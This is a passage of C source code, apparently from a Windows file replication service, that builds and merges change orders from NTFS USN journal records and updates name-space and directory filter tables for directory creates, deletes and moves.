           !BooleanFlagOn(UsnRecord->Reason, USN_REASON_REPARSE_POINT_CHANGE)) {
            MergeOk = FALSE;
            CHANGE_ORDER_TRACE(3, ChangeOrder, "Not a reparse point change Merge NOT OK ");
        }

        if(MergeOk && (BooleanFlagOn(UsnRecord->Reason, USN_REASON_RENAME_NEW_NAME |
                                                        USN_REASON_FILE_DELETE))) {

            //
            // If this is not a serialized operation (MOVEDIR or MOVERS)
            // then first test for conflict on the current name/parent FID of the
            // file.  Then if that's ok test for a conflict on the previous name.
            //
            if (CO_MOVE_RS_OR_DIR(LocationCmd)) {
                MergeOk = FALSE;
                CHANGE_ORDER_TRACE(3, ChangeOrder, "MOVERS/DIR Merge NOT OK ");
            }

            if (MergeOk) {
                FrsSetUnicodeStringFromRawString(&UnicodeStr,
                                                  UsnRecord->FileNameLength,
                                                  UsnRecord->FileName,
                                                  UsnRecord->FileNameLength);
                MergeOk = JrnlMergeCoTest(pVme,
                                         &UnicodeStr,
                                         &UsnRecord->ParentFileReferenceNumber,
                                          ChangeOrder->StreamLastMergeSeqNum);
                if (MergeOk) {
                    CHANGE_ORDER_TRACE(3, ChangeOrder, "Curr parent Merge OK ");
                } else {
                    CHANGE_ORDER_TRACE(3, ChangeOrder, "Curr parent Merge NOT OK ");
                }
            }

            //
            // If the Merge is still on and this is a rename then check for
            // a conflict in the use of the previous name that will go away.
            //
            if (MergeOk &&
                BooleanFlagOn(UsnRecord->Reason, USN_REASON_RENAME_NEW_NAME)) {
                MergeOk = JrnlMergeCoTest(pVme,
                                         &ChangeOrder->UFileName,
                                         &OriginalParentFilterEntry->DFileID,
                                          ChangeOrder->StreamLastMergeSeqNum);
                if (MergeOk) {
                    CHANGE_ORDER_TRACE(3, ChangeOrder, "Orig parent Merge OK ");
                } else {
                    CHANGE_ORDER_TRACE(3, ChangeOrder, "Orig parent Merge NOT OK ");
                }
            }
        }

        if (MergeOk) {
            //
            // Update the seq number of last USN record to contribute to CO.
            //
            ChangeOrder->StreamLastMergeSeqNum = StreamSequenceNumber;
        }

        PendingCo = MergeOk;

        //
        // Creating new change order; drop reference on current change order
        //
        if (!PendingCo) {
            GStatus = GhtDereferenceEntryByAddress(ChangeOrderTable,
                                                   ChangeOrder,
                                                   TRUE);
            if (GStatus != GHT_STATUS_SUCCESS) {
                DPRINT(0, "++ ERROR: GhtDereferenceEntryByAddress ref count non positive.\n");
                FRS_PRINT_TYPE(0, ChangeOrder);
                FRS_ASSERT(!"JrnlEnterFileCO: ref count non positive");
                goto RETURN;
            }
        }
    }


    if (!PendingCo) {
        //
        // Construct new change order.
        //
        ChangeOrder = JrnlCreateCo(OriginalReplica,
                                  &UsnRecord->FileReferenceNumber,
                                  &OriginalParentFilterEntry->DFileID,
                                   UsnRecord,
                                   BooleanFlagOn(UsnRecord->FileAttributes,
                                                 FILE_ATTRIBUTE_DIRECTORY),
                                   UsnRecord->FileName,
                                   UsnRecord->FileNameLength);

        ChangeOrder->StreamLastMergeSeqNum = StreamSequenceNumber;
        //
        // Set this up now so it appears in the log file.  It is overwritten
        // later with the real CO Guid when the CO is issued.
        //
        ChangeOrder->Cmd.ChangeOrderGuid.Data1 = StreamSequenceNumber;

        CHANGE_ORDER_TRACEX(3, ChangeOrder, "Local Co Create", UsnRecord->Reason);
    } else {
        CHANGE_ORDER_TRACEX(3, ChangeOrder, "Local Co Update", UsnRecord->Reason);
    }

    //
    // Update the Name Space Table with the current stream sequence number.
    // Do this for both the file name and the parent dir name.  In the case
    // of rename do it for the original and current file name and parent names.
    // So there are four cases.  The table below shows where the filename
    // and the File ID come from for each case.
    //
    //                     File Name                       Parent Filename
    //
    // Curr File     UsnRecord->FileName                UsnRecord->ParentFID
    // Curr Parent   NewParentFilterEntry->UFileName    NewParentFilterEntry->DParentFileID
    // Orig File     RenOldNameTable->FileName          RenOldNameTable->ParentFID
    // Orig Parent   OrigParentFilterEntry->UFileName   OrigParentFilterEntry->DParentFileID
    //
    // Note:
    //   - The Curr info is only needed if CO is not a MOVEOUT.
    //   - The Orig info on the filename is only relevant if CO is a rename.
    //   - The Orig info on the parent dir is only relevant if CO is
    //     MoveOut, MoveDir or MoveRs.
    //

    if (LocationCmd != CO_LOCATION_MOVEOUT) {
        //
        // Update Curr File (Where the USN record says file went)
        //
        FrsSetUnicodeStringFromRawString(&UnicodeStr,
                                          UsnRecord->FileNameLength,
                                          UsnRecord->FileName,
                                          UsnRecord->FileNameLength);
        JrnlUpdateNst(pVme,
                     &UnicodeStr,
                     &UsnRecord->ParentFileReferenceNumber,
                      StreamSequenceNumber);
        //
        // Update Curr parent (the parent dir where file went)
        //
        JrnlUpdateNst(pVme,
                     &NewParentFilterEntry->UFileName,
                     &NewParentFilterEntry->DParentFileID,
                      StreamSequenceNumber);
    }

    if (BooleanFlagOn(UsnRecord->Reason, USN_REASON_RENAME_NEW_NAME)) {

        //
        // Update Orig File location for rename COs.
        // We use the info saved in the most recent Rename Old USN record for this file
        // on the volume.  Then free the saved old name.
        //
        OldRenUsnRec = NULL;
        GStatus = QHashLookup(pVme->RenOldNameTable,
                              &UsnRecord->FileReferenceNumber,
                              NULL,
                              (PULONG_PTR) &OldRenUsnRec);

        if (OldRenUsnRec != NULL) {

            FrsSetUnicodeStringFromRawString(&UnicodeStr2,
                                              OldRenUsnRec->FileNameLength,
                                              OldRenUsnRec->FileName,
                                              OldRenUsnRec->FileNameLength);

            JrnlUpdateNst(pVme,
                         &UnicodeStr2,
                         &OldRenUsnRec->ParentFileReferenceNumber,
                          StreamSequenceNumber);


            OldRenUsnRec = FrsFree(OldRenUsnRec);

            GStatus = QHashDelete(pVme->RenOldNameTable,
                                  &UsnRecord->FileReferenceNumber);

            if (GStatus != GHT_STATUS_SUCCESS ) {
                DPRINT1(0, "++ QHashDelete error: %d\n", GStatus);
            }

        } else {
            DPRINT1(0, "RENAME_OLD_NAME record not found for Fid: %08x %08x\n",
                    PRINTQUAD(UsnRecord->FileReferenceNumber));
        }
    }

    if (CO_MOVE_OUT_RS_OR_DIR(LocationCmd)) {

        //
        // Update Orig Parent (The original parent dir where the file came from)
        //
        JrnlUpdateNst(pVme,
                     &OriginalParentFilterEntry->UFileName,
                     &OriginalParentFilterEntry->DParentFileID,
                      StreamSequenceNumber);
    }


    //
    // Update the change order.  This drops our ref on the change order.
    //
    WStatus = JrnlUpdateChangeOrder(ChangeOrder,
                                    CurrentReplica,
                                    UsnRecord->ParentFileReferenceNumber,
                                    LocationCmd,
                                    UsnRecord);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT(0, "++ Error - failed to insert or update change order\n");
        DPRINT_WS(0, "JrnlUpdateChangeOrder", WStatus);
    } else {
        DPRINT1(4, "++ ChangeOrder %s success\n", (PendingCo ? "update" : "create"));
    }


RETURN:

    //
    // Drop the locks on the change order process lists.
    //
    FrsRtlReleaseListLock(&pVme->ChangeOrderList);

    return WStatus;

}


PCHANGE_ORDER_ENTRY
JrnlCreateCo(
    IN PREPLICA       Replica,
    IN PULONGLONG     Fid,
    IN PULONGLONG     ParentFid,
    IN PUSN_RECORD    UsnRecord,
    IN BOOL           IsDirectory,
    IN PWCHAR         FileName,
    IN USHORT         Length
)
/*++

Routine Description:

    This functions allocates a change order entry and inits some of the fields.

    Depending on the change order some of these fields are overwritten later.

Arguments:

    Replica - ptr to replica set for this change order.
    Fid - The file reference number for the local file.
    ParentFid - The parent file reference number for this file.
    UsnRecord - The NTFS USN record describing the change.  When walking a
                through a sub-tree this will be the USN record of the sub-tree root.
    IsDirectory - TRUE if this CO is for a directory.
    FileName - Filename for this file.  For a sub tree op it comes from the
               filter entry.
    Length - the file name length in bytes.

Return Value:

    ptr to change order entry.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlCreateCo:"

    PCHANGE_ORDER_ENTRY ChangeOrder;

    //
    // Construct new change order.
    // Set the initial reference count to 1.
    //
    ChangeOrder = FrsAllocType(CHANGE_ORDER_ENTRY_TYPE);
    ChangeOrder->HashEntryHeader.ReferenceCount = 1;

    //
    // The command flag CO_FLAG_LOCATION_CMD should be clear.
    // Mark this change order as a file or a directory.
    // Note: If this CO is being generated off of a directory filter table
    // entry (e.g. Moveout) then the ChangeOrder->Cmd.FileAttributes will
    // be zero.  ChgOrdReadIdRecord() detects this and inserts the file
    // attributes from the IDTable record.
    //
    SET_CO_LOCATION_CMD(ChangeOrder->Cmd,
                        DirOrFile,
                       (IsDirectory ? CO_LOCATION_DIR : CO_LOCATION_FILE));

    SET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command, CO_LOCATION_NO_CMD);

    //
    //  Capture the file name.
    //
    FRS_ASSERT(Length <= MAX_PATH*2);
    CopyMemory(ChangeOrder->Cmd.FileName, FileName, Length);
    ChangeOrder->Cmd.FileName[Length/2] = UNICODE_NULL;
    ChangeOrder->UFileName.Length = Length;
    ChangeOrder->Cmd.FileNameLength = Length;

    //
    //  Set New and orig Replica fields to the replica.
    //
    ChangeOrder->OriginalReplica = Replica;
    ChangeOrder->NewReplica      = Replica;
    ChangeOrder->Cmd.OriginalReplicaNum = ReplicaAddrToId(Replica);
    ChangeOrder->Cmd.NewReplicaNum      = ReplicaAddrToId(Replica);

    //
    //  Set New and orig parent FID fields to the parent FID.
    //
    ChangeOrder->OriginalParentFid = *ParentFid;
    ChangeOrder->NewParentFid      = *ParentFid;
    ChangeOrder->ParentFileReferenceNumber = *ParentFid;
    ChangeOrder->FileReferenceNumber   = *Fid;

    //
    // Init with data from the USN Record.
    //
    ChangeOrder->EntryCreateTime = CO_TIME_NOW(Replica->pVme);
    ChangeOrder->Cmd.EventTime = UsnRecord->TimeStamp;
    ChangeOrder->Cmd.JrnlFirstUsn = UsnRecord->Usn;

    return ChangeOrder;
}


BOOL
JrnlMergeCoTest(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN PUNICODE_STRING     UFileName,
    IN PULONGLONG          ParentFid,
    IN ULONG               StreamLastMergeSeqNum
)

/*++

Routine Description:

    Check if a new Usn record can be merged with this change order.
    If there is any reference to the file name in the Usn record stream
    after the point where the last merge occurred then we return FALSE
    indicating the merge is disallowed.  The ptr to the QHashEntry is returned
    (if it is found) so LastUseSequenceNumber can be updated.

Arguments:


    pVme - ptr to the volume monitor entry (w/ name space table) for test.
    UFileName - Unicode Filename for this file.
    ParentFid - The parent file reference number for this file.
    StreamLastMergeSeqNum - The Seq Num of last Usn Record merged into CO.

Return Value:

    True if Merge is ok else false.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlMergeCoTest:"

    ULONGLONG    QuadHashValue;
    ULONG        StreamLastUseSeqNum;
    PQHASH_ENTRY NstEntry;


    CalcHashFidAndName(UFileName, ParentFid, &QuadHashValue);

    NstEntry = QHashLookupLock(pVme->NameSpaceTable, &QuadHashValue);

    if (NstEntry != NULL) {

        StreamLastUseSeqNum = (ULONG)NstEntry->Flags;

        if (StreamLastUseSeqNum > StreamLastMergeSeqNum) {
            //
            // There is a ref to this name in the Usn stream after
            // point where the last record was merged with this CO.
            // Can't merge this Usn Record.
            //
            return FALSE;
        }
    }

    return TRUE;
}


ULONG
JrnlPurgeOldRenameWorker (
    PQHASH_TABLE Table,
    PQHASH_ENTRY BeforeNode,
    PQHASH_ENTRY TargetNode,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru QHashEnumerateTable() to clean out stale entries.

Arguments:

    Table - the hash table being enumerated
    BeforeNode  -- ptr to the QhashEntry before the node of interest.
    TargetNode  -- ptr to the QhashEntry of interest.
    Context - ptr to the USN to compare against.

Return Value:

    FRS Status

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlPurgeOldRenameWorker:"

    USN PurgeUsn = *(USN *)Context;

    PUSN_RECORD OldRenUsnRec;

    OldRenUsnRec = (PUSN_RECORD) (TargetNode->Flags);

    if (OldRenUsnRec == NULL) {
        //
        // All valid entries should point to a USN record but if not then
        // just delete the qhash entry.
        //
        return FrsErrorDeleteRequested;
    }

    if (OldRenUsnRec->Usn < PurgeUsn) {
        //
        // This record is past the point of interest so clean it out.
        //
        OldRenUsnRec = FrsFree(OldRenUsnRec);
        TargetNode->Flags = (ULONG_PTR) NULL;
        //
        // Tell QHashEnumerateTable() to delete the node and continue the enum.
        //
        return FrsErrorDeleteRequested;
    }


    return FrsErrorSuccess;
}




ULONG
JrnlPurgeNstWorker (
    PQHASH_TABLE Table,
    PQHASH_ENTRY BeforeNode,
    PQHASH_ENTRY TargetNode,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru QHashEnumerateTable() to clean out stale entries.

Arguments:

    Table - the hash table being enumerated
    BeforeNode  -- ptr to the QhashEntry before the node of interest.
    TargetNode  -- ptr to the QhashEntry of interest.
    Context - ptr to the Stream Sequence Number to compare against.

Return Value:

    FRS Status

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlPurgeNstWorker:"

    ULONG StreamSeqNum = *(ULONG *)Context;


    if ( (ULONG)(TargetNode->Flags) < StreamSeqNum) {

        DPRINT5(4, "JrnlPurgeNstWorker - BeforeNode: %08x, Link: %08x,"
                   " Flags: %08x, Tag: %08x %08x, Data: %08x %08x\n",
               BeforeNode, TargetNode->NextEntry, TargetNode->Flags,
               PRINTQUAD(TargetNode->QKey), PRINTQUAD(TargetNode->QData));

        //
        // Tell QHashEnumerateTable() to delete the node and continue the enum.
        //
        return FrsErrorDeleteRequested;
    }

    return FrsErrorSuccess;
}



VOID
JrnlUpdateNst(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN PUNICODE_STRING UFileName,
    IN PULONGLONG      ParentFid,
    IN ULONG           StreamSequenceNumber
)

/*++

Routine Description:

    Update the LastUseSequenceNumber in the Name Space Table.
    If the entry is not present, create it.

Arguments:

    pVme - ptr to the volume monitor entry (w/ name space table) for test.
    UFileName - Unicode Filename for this file.
    ParentFid - The parent file reference number for this file.
    StreamLastMergeSeqNum - The Seq Num of last Usn Record merged into CO.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlUpdateNst:"

    ULONGLONG    Qhv;
    USN          PurgeUsn;
    PQHASH_ENTRY NstEntry;
    ULONG        LastFetched, LastCleaned;

    CalcHashFidAndName(UFileName, ParentFid, &Qhv);

    NstEntry = QHashLookupLock(pVme->NameSpaceTable, &Qhv);

    if (NstEntry != NULL) {
        NstEntry->Flags = StreamSequenceNumber;
    } else {
        //
        // Name not found.  Create a new entry.
        //
        QHashInsertLock(pVme->NameSpaceTable, &Qhv, &Qhv, StreamSequenceNumber);
    }


    //
    // Every so often sweep the Name Space Table and clean out stale entries.
    // By doing this as part of the Journal monitor thread we can avoid
    // using locks on the NameSpaceTable since this is the only thread that
    // touches it.
    //
    if ((StreamSequenceNumber & 127) == 0) {
        LastFetched = pVme->StreamSequenceNumberFetched;
        LastCleaned = pVme->StreamSequenceNumberClean;

        if ((LastFetched > LastCleaned) &&
            ((LastFetched - LastCleaned) > 100)) {
            //
            // Sweep the table and purge any entries with a Stream Sequence
            // Number less than LastFetched since that CO is no longer in the
            // process queue.
            //
            QHashEnumerateTable(pVme->NameSpaceTable,
                                JrnlPurgeNstWorker,
                                &LastFetched);
            pVme->StreamSequenceNumberClean = LastFetched;

            //
            // Clean up stray entries in the Old Rename name table too.
            //
            PurgeUsn = pVme->LastUsnSavePoint;
            QHashEnumerateTable(pVme->RenOldNameTable,
                                JrnlPurgeOldRenameWorker,
                                &PurgeUsn);
        }
    }
}



VOID
JrnlFilterUpdate(
    IN PREPLICA             CurrentReplica,
    IN PUSN_RECORD          UsnRecord,
    IN ULONG                LocationCmd,
    IN PFILTER_TABLE_ENTRY  OldParentFilterEntry,
    IN PFILTER_TABLE_ENTRY  NewParentFilterEntry
    )
/*++

Routine Description:

    Process a directory operation.  Generate the change order(s) and update the
    Filter table.  This may involve multiple operations over a subtree.

    It assumes it is being called with a USN directory change record and
    that references have been taken on OldParentFilterEntry and
    NewParentFilterEntry.

Arguments:

    CurrentReplica - ptr to the Replica struct containing the directory now.
    UsnRecord - ptr to the UsnRecord.
    LocationCmd - The change order location command. (MOVEIN, MOVEOUT, ...)
    OldParentFilterEntry - The filter entry for the directory's previous parent.
    NewParentFilterEntry - The filter entry for the directory's current parent.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlFilterUpdate:"

    PGENERIC_HASH_TABLE  FilterTable = CurrentReplica->pVme->FilterTable;
    PFILTER_TABLE_ENTRY  FilterEntry;
    ULONG                GStatus, WStatus;
    ULONG                Flags;
    PULONGLONG           FileID;
    PREPLICA             OriginalReplica;
    CHANGE_ORDER_PARAMETERS Cop;

    //
    // Determine the file location command to use in the change order.
    // First get the old parent file ID incase this was a rename.
    //
    FileID = &UsnRecord->FileReferenceNumber;

    //
    // If there is no old parent filter entry (Create, Delete, MOVEIN or NO_CMD)
    // then the original replica is NULL.
    //
    OriginalReplica = (OldParentFilterEntry == NULL) ?
                       NULL : OldParentFilterEntry->Replica;

    //
    // Look for an entry in the Filter Table for this DIR and create a new
    // one if needed.
    //
    GStatus = GhtLookup(FilterTable, FileID, TRUE, &FilterEntry);

    if (GStatus == GHT_STATUS_SUCCESS) {
        //
        // For a create the entry could already be in the table.  This could
        // happen when a Replica Load inserts the directory and then we see the
        // Journal Entry for the create later.  If only the Create bit is set
        // in the reason mask there is nothing for us to do.
        //
        if (UsnRecord->Reason == (USN_REASON_FILE_CREATE | USN_REASON_CLOSE)) {
            DPRINT(4,"++ USN_REASON_FILE_CREATE: for dir with entry in table.  skipping\n");
            GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
            return;
        }
    } else {

        //
        // Create a filter entry for this directory if it's a create or movein.
        // A MoveIn is the same as a create dir since we need to create a filter
        // table entry and only a single dir is involved.  It is possible that
        // the update process has already found the dir and added the filter
        // entry.  If so we generate the change order anyway since there may
        // be other reason flags to consider.  There is no original replica
        // for a create or a rename.
        //
        if (CO_NEW_FILE(LocationCmd)) {
            //
            // The following returns with a reference on FilterEntry.
            //
            WStatus = JrnlAddFilterEntryFromUsn(CurrentReplica,
                                                UsnRecord,
                                                &FilterEntry);
            if (!WIN_SUCCESS(WStatus)) {
                DUMP_USN_RECORD2(3, UsnRecord, CurrentReplica->ReplicaNumber, LocationCmd);
                DPRINT(1, "++ ERROR - JrnlAddFilterEntryFromUsn failed\n");
                return;
            }
        } else {
            //
            // Note:  touching a dir that was previously EXCLUDED fails to add filter entry
            //
            DUMP_USN_RECORD2(3, UsnRecord, CurrentReplica->ReplicaNumber, LocationCmd);
            DPRINT(1, "++ Warning: Dir not found in Filter Table and not a CO_NEW_FILE, skipping\n");
            return;

        }
    }

    //
    // Process the directory through the volume filter and generate the
    // appropriate change orders.
    //


    //
    // Setup the change order parameters.
    //
    // Original and current/new Replica Sets
    // new parent FID.
    // Usn Record triggering change order creation. (i.e. the op on root of
    // the subtree).
    // The location change command.
    // Original and current/new parent filter entries of root filter entry
    //
    Cop.OriginalReplica = OriginalReplica;
    Cop.NewReplica      = CurrentReplica;
    Cop.NewParentFid    = UsnRecord->ParentFileReferenceNumber;
    Cop.UsnRecord       = UsnRecord;
    Cop.NewLocationCmd  = LocationCmd;
    Cop.OrigParentFilterEntry = OldParentFilterEntry;
    Cop.NewParentFilterEntry  = NewParentFilterEntry;

    //
    // Process the subtree starting at the root filter entry of change.
    //
    WStatus = JrnlProcessSubTree(FilterEntry, &Cop);

    //
    // Drop the ref on the filter entry if it wasn't deleted.
    //
    if ((FilterEntry != NULL) &&
        !((LocationCmd == CO_LOCATION_DELETE) ||
          (LocationCmd == CO_LOCATION_MOVEOUT))) {
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
    }

    return;
}



ULONG
JrnlProcessSubTree(
    IN PFILTER_TABLE_ENTRY  RootFilterEntry,
    IN PCHANGE_ORDER_PARAMETERS Cop
    )
/*++

Routine Description:

    This function is called to build a change order parameter block and
    enumerate through a filter subtree.  It acquires the necessary locks
    for the duration of the operation.

Arguments:

    RootFilterEntry - The root of the filter subtree being operated on.
                      NULL if it doesn't yet exist (e.g. MOVEIN or CREATE).
    Cop - Struct with the change order param data to pass down the subtree.

Return Value:

    win32 status

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlProcessSubTree:"

    ULONG                   WStatus;
    PGENERIC_HASH_TABLE     FilterTable;
    PVOLUME_MONITOR_ENTRY   pVme;
    PREPLICA                NewReplica = Cop->NewReplica;
    ULONG                   NewLocationCmd = Cop->NewLocationCmd;
    PREPLICA                OriginalReplica = Cop->OriginalReplica;


    if (NewLocationCmd == CO_LOCATION_MOVEOUT) {
        pVme = OriginalReplica->pVme;
    } else {
        pVme = NewReplica->pVme;
    }

    FilterTable = pVme->FilterTable;

    //
    // Get the change order process list lock for the volume.
    //
    FrsRtlAcquireListLock(&pVme->ChangeOrderList);

    //
    // dispatch on new location command.
    // Get locks and enumerate subtree top down or bottom up.
    //
    switch (NewLocationCmd) {

    case  CO_LOCATION_NO_CMD:
        //
        // Even though there is no location change.  There could still be a
        // dir related content change.  So process like a create that the
        // update process got to first.
        //
    case  CO_LOCATION_CREATE:
    case  CO_LOCATION_MOVEIN:
    case  CO_LOCATION_MOVEIN2:
        //
        // Create a change order for it.  Not really a subtree operation.
        // A MoveIn is the same as a create dir since we need to create a filter
        // table entry and only a single dir is involved.  It is possible that
        // the update process has already found the dir and added the filter
        // entry.  If so we generate the change order anyway since there may
        // be other reason flags to consider.  There is no original replica
        // for a create or a MOVEIN.  The caller sets original replica to
        // new replica and has created the filter entry.
        //
        // Bump the ref count to keep the count in sync with the path through
        // JrnlEnumerateFilterTreexx().
        //
        INCREMENT_FILTER_REF_COUNT(RootFilterEntry);

        WStatus = JrnlProcessSubTreeEntry(FilterTable, RootFilterEntry, Cop);

        DPRINT_WS(0, "++ Error - failed to add change order for dir create:", WStatus);
        break;


    case  CO_LOCATION_DELETE:
    case  CO_LOCATION_MOVEDIR:
        //
        // Create change order for the directory delete and delete filter entry.
        // Not really a subtree operation since the dir can have no children
        // when it's deleted.
        // If the operation is MOVEDIR then JrnlProcessSubTreeEntry() will
        // change the parent dir in the filter entry and put it on the child
        // list of the new parent.
        //
        // Bump the ref count to keep the count in sync with the path through
        // JrnlEnumerateFilterTreexx().
        //
        INCREMENT_FILTER_REF_COUNT(RootFilterEntry);

        JrnlAcquireChildLock(NewReplica);

        WStatus = JrnlProcessSubTreeEntry(FilterTable, RootFilterEntry, Cop);

        DPRINT_WS(0, "++ Error - failed to add change order for dir create:", WStatus);

        JrnlReleaseChildLock(NewReplica);

        break;



    case  CO_LOCATION_MOVEOUT:
        //
        // An entire subtree is renamed out of the replica tree.
        //
        // Get the lock on the filter entry child list for this replica.
        // Walk the subtree bottom up, creating the change orders for the
        // MOVEOUT and deleting the filter entries at the same time.
        // Drop the child list lock.
        //

        JrnlAcquireChildLock(OriginalReplica);
        WStatus = JrnlEnumerateFilterTreeBU(FilterTable,
                                            RootFilterEntry,
                                            JrnlProcessSubTreeEntry,
                                            Cop);
        JrnlReleaseChildLock(OriginalReplica);
        DPRINT_WS(0, "++ Error - failed to add change order for dir MOVEOUT:", WStatus);

        break;


    case  CO_LOCATION_MOVERS:
        //
        // Get the lock on the filter entry child list for both this replica
        // and the new replica set.
        // Walk the subtree Top-Down, creating the change orders for the MOVERS.
        // Drop the child list locks.
        //

        JrnlAcquireChildLockPair(OriginalReplica, NewReplica);

        WStatus = JrnlEnumerateFilterTreeTD(FilterTable,
                                            RootFilterEntry,
                                            JrnlProcessSubTreeEntry,
                                            Cop);

        JrnlReleaseChildLockPair(OriginalReplica, NewReplica);
        DPRINT_WS(0, "++ Error - failed to add change order for dir MOVERS:", WStatus);

        break;



    default:

        DPRINT(0, "++ ERROR - Invalid NewLocationCmd arg\n");
        FRS_ASSERT(!"JrnlProcessSubTree: Invalid NewLocationCmd");

    } // end switch

    //
    // Release the volume change order lock.
    //
    FrsRtlReleaseListLock(&pVme->ChangeOrderList);

    return WStatus;

}



ULONG
JrnlProcessSubTreeEntry(
    PGENERIC_HASH_TABLE FilterTable,
    PVOID Buffer,
    PVOID Context
    )
/*++

Routine Description:

    This function is called thru JrnlEnumerateFilterTreexx() to process a
    Filter entry and submit a change order for same.

    After the change order is generated the filter table entry is updated
    as needed to reflect a new parent or a new replica set or a name change.

    All required locks are acquired by the caller of the enumerate function.
    This includes one or two filter entry child locks and the change order
    list lock.

    The caller has taken out a reference on the FilterEntry (Buffer).  We
    retire that reference here.

Arguments:

    FilterTable - the hash table being enumerated (to lookup parent entry).
    Buffer - a ptr to a FILTER_TABLE_ENTRY
    Context - A pointer to the change order parameter struct.

Return Value:

    ERROR_SUCCESS to keep the enumeration going.
    Any other status stops the enumeration and returns this value to the
    caller of the enumerate function.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlProcessSubTreeEntry:"


    UNICODE_STRING           UFileName;

    ULONG                    WStatus, WStatus1;
    ULONG                    GStatus;
    BOOL                     Root;
    PCHANGE_ORDER_ENTRY      ChangeOrder;
    PUSN_RECORD              UsnRecord;
    ULONG                    StreamSeqNum;
    ULONG                    LocationCmd;
    PVOLUME_MONITOR_ENTRY    pVme;

    PFILTER_TABLE_ENTRY      OrigParentFilterEntry;
    PFILTER_TABLE_ENTRY      NewParentFilterEntry;
    PFILTER_TABLE_ENTRY      FE, FEList[8];
    ULONG                    FEx;

    PWCHAR                   FileName;
    PFILTER_TABLE_ENTRY      FilterEntry = (PFILTER_TABLE_ENTRY) Buffer;
    PCHANGE_ORDER_PARAMETERS Cop = (PCHANGE_ORDER_PARAMETERS) Context;

    USHORT                   Length;


    //
    // The USN record that triggered the SubTree operation
    //
    UsnRecord   = Cop->UsnRecord;
    LocationCmd = Cop->NewLocationCmd;
    OrigParentFilterEntry = Cop->OrigParentFilterEntry;
    NewParentFilterEntry  = Cop->NewParentFilterEntry;

    pVme = FilterEntry->Replica->pVme;

    //
    // If the FID in the UsnRecord matches the FID in the Filter Entry then
    // this operation is on the root of the subtree and is different than if
    // it was on a child.
    //
    Root = (UsnRecord->FileReferenceNumber == FilterEntry->DFileID);

#if 0
// For now no merging of the DIR change orders.  If this proves to be a perf
// problem then need to add the code check for name conflicts.
    //
    // Check for a pending change order for this Dir entry.  If the lookup
    // succeeds the ref count is decremented by JrnlUpdateChangeOrder because
    // it may end up evaporating the change order.
    //
    GStatus = GhtLookup(pVme->ChangeOrderTable,
                        &FilterEntry->DFileID,
                        TRUE,
                        &ChangeOrder);

    if (GStatus == GHT_STATUS_SUCCESS) {
        //
        // A pending change order exists,  Update it.
        //
        CHANGE_ORDER_TRACEX(3, ChangeOrder, "Local Co Update", UsnRecord->Reason);
    } else {
#endif

        //
        // No pending change order exists for this Dir.  Create one.
        //
        // Since multiple change orders are derived from a single Journal Usn
        // how do we decide to update our stable copy of the Journal USN?
        // The stable copy means the current one we are working on and may not
        // have finished.

        if (Root) {
            //
            // If the root of the sub-tree then name comes from USN Record.
            //
            FileName = UsnRecord->FileName;
            Length = UsnRecord->FileNameLength;
        } else {
            //
            // If not root of sub-tree then name comes from filter entry and
            // JrnlFirstUsn is set to zero.
            //
            FileName = FilterEntry->DFileName;
            Length = (USHORT)(2*wcslen(FilterEntry->DFileName));
        }

        //
        // Create the change order.
        //
        ChangeOrder = JrnlCreateCo(FilterEntry->Replica,
                                  &FilterEntry->DFileID,
                                  &FilterEntry->DParentFileID,
                                   UsnRecord,
                                   TRUE,               // DIR CO
                                   FileName,
                                   Length);
        //
        // Make a new stream sequence number and save it in the CO.
        // Stick it in the CO Guid so it appears in the log file.
        // It gets overwritten later with real CO Guid when the CO issues.
        //
        StreamSeqNum = ++pVme->StreamSequenceNumber;
        ChangeOrder->StreamLastMergeSeqNum = StreamSeqNum;
        ChangeOrder->Cmd.ChangeOrderGuid.Data1 = StreamSeqNum;

        ChangeOrder->OriginalParentFid = FilterEntry->DParentFileID;


        if (Root) {
            CHANGE_ORDER_TRACEX(3, ChangeOrder, "Local Co Root Create",
                                UsnRecord->Reason);
        } else {
            ChangeOrder->Cmd.JrnlFirstUsn = (USN) 0;
            CHANGE_ORDER_TRACEX(3, ChangeOrder, "Local Co Subdir Create",
                                UsnRecord->Reason);
        }

#if 0
    }
#endif


    //
    // Update the Name Space Table with the current stream sequence number.
    // Since this is a dir subtree entries are made for all parents implicitly
    // until we get to the root.  The root needs to have its parent dir added
    // to the name space table.  The table below shows what entries are made
    // depending on the file operation and whether or not this call is for
    // the root entry of the subtree operation.
    //
    // Opn       Make Entry using    Make Entry using
    //           orig name/parent   Current name/parent
    //                info               info (1)
    //
    // Movein          No                 Yes
    // Moveout         Yes                No
    // Movedir         Yes                Yes
    // Movers          Yes                Yes
    //
    // SimpleRen       Yes                Yes
    // Create          No                 Yes
    // Delete          No                 Yes
    // Update          No                 Yes
    //
    // The last four entries affect single dirs only while the first four
    // can apply to subtrees.
    // (1) If working in a single dir or the root of a sub-tree the current
    //     name/parent info comes from the USN record.
    //
    FEx = 0;

    if (Root) {
        if (LocationCmd != CO_LOCATION_MOVEOUT) {
            //
            // Update Curr File (Where the USN record says file went)
            // Update New parent (the parent dir where file went)
            //
            FrsSetUnicodeStringFromRawString(&UFileName,
                                              UsnRecord->FileNameLength,
                                              UsnRecord->FileName,
                                              UsnRecord->FileNameLength);
            JrnlUpdateNst(pVme,
                          &UFileName,
                          &UsnRecord->ParentFileReferenceNumber,
                          StreamSeqNum);

            FRS_ASSERT(NewParentFilterEntry != NULL);
            FEList[FEx++] = NewParentFilterEntry;
        }

        if (CO_MOVE_OUT_RS_OR_DIR(LocationCmd)) {

            //
            // Update with old name/parent of root dir.
            // (Where the Original parent Filter entry says it was.)
            // Update orig parent of root dir (the parent dir where file came from)
            //
            FEList[FEx++] = FilterEntry;

